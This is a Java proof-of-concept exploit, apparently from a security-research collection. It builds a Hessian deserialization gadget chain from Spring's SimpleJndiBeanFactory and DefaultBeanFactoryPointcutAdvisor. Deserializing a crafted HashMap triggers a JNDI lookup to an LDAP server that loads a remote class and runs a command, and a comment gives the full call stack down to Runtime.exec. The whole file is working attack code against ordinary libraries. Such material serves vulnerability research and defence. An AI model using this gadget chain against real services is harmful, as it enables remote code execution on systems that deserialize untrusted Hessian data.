package com.javasec.pocs.hessian.springaop;

import com.javasec.utils.SerializeUtils;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.util.HashMap;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:-1, ExecTemplateJDK7
 * forName0:-1, Class (java.lang)
 * forName:348, Class (java.lang)
 * loadClass:72, VersionHelper12 (com.sun.naming.internal)
 * loadClass:87, VersionHelper12 (com.sun.naming.internal)
 * getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
 * getObjectInstance:189, DirectoryManager (javax.naming.spi)
 * c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
 * p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
 * lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
 * lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
 * lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
 * lookup:417, InitialContext (javax.naming)
 * doInContext:155, JndiTemplate$1 (org.springframework.jndi)
 * execute:87, JndiTemplate (org.springframework.jndi)
 * lookup:152, JndiTemplate (org.springframework.jndi)
 * lookup:179, JndiTemplate (org.springframework.jndi)
 * lookup:95, JndiLocatorSupport (org.springframework.jndi)
 * doGetSingleton:211, SimpleJndiBeanFactory (org.springframework.jndi.support)
 * getBean:111, SimpleJndiBeanFactory (org.springframework.jndi.support)
 * getAdvice:116, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)
 * equals:76, AbstractPointcutAdvisor (org.springframework.aop.support)
 * putVal:634, HashMap (java.util)
 * put:611, HashMap (java.util)
 * readMap:114, MapDeserializer (com.caucho.hessian.io)
 * readMap:577, SerializerFactory (com.caucho.hessian.io)
 * readObject:2093, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:275, SerializeUtils (com.javasec.utils)
 * main:19, springaop2 (com.javasec.pocs.hessian.springaop)
 */
public class springaop2 {
    public static void main(String[] args) throws Exception {
        String ldapurl="ldap://127.0.0.1:1389/cgefow";
        SimpleJndiBeanFactory simpleJndiBeanFactory = new SimpleJndiBeanFactory();
        simpleJndiBeanFactory.setShareableResources(ldapurl);
        DefaultBeanFactoryPointcutAdvisor defaultBeanFactoryPointcutAdvisor = new DefaultBeanFactoryPointcutAdvisor();
        defaultBeanFactoryPointcutAdvisor.setBeanFactory(simpleJndiBeanFactory);
        defaultBeanFactoryPointcutAdvisor.setAdviceBeanName(ldapurl);
        SerializeUtils.setFieldValue(defaultBeanFactoryPointcutAdvisor,"pointcut",null);
        HashMap<Object, Object> map = SerializeUtils.makeMap(new DefaultBeanFactoryPointcutAdvisor(),defaultBeanFactoryPointcutAdvisor);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianSerial(map));

    }
}
